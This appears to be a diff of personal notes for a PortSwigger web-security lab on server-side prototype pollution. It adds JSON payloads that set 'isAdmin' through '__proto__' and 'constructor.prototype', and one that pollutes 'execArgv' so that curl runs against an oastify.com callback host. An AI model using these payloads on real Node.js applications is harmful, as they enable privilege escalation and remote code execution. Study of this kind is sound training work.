@@ -108,4 +108,52 @@ Mass assignement not working? Try prototype pollution.
         "isAdmin":"true"
     }
 }
-    ```
+```
+    
+Non-destructive method:
+
+```
+...
+"__proto__": {
+    "status":555
+}
+...
+```
+
+If not working, try to break the JSON format and keep the above.
+
+Bypass flawed input filter with Constructor
+NOTE: this can crash server, so it's better to start with more  easy stuff...
+
+```
+"constructor": {
+    "prototype": {
+        "json spaces":10
+    }
+}
+```
+
+```
+"constructor": {
+    "prototype": {
+        "isAdmin":true
+    }
+}
+```
+
+The lab is lagging...
+https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution
+
+```
+{
+    "csrf":"OqwKew95Z7pzmd0On7q0LAqXPySnw7lt",
+    "sessionId":"AKySV3lDI1AMJSlnXSTuBywAwhvdrlN0",
+    "tasks":["db-cleanup",
+    "fs-cleanup"],
+    "__proto__": {
+        "execArgv":[
+            "--eval=require('child_process').execSync('curl https://d5jw5pbq9uqpxi5hosro1rlm2d85wykn.oastify.com')"
+        ]
+    }
+}
+```
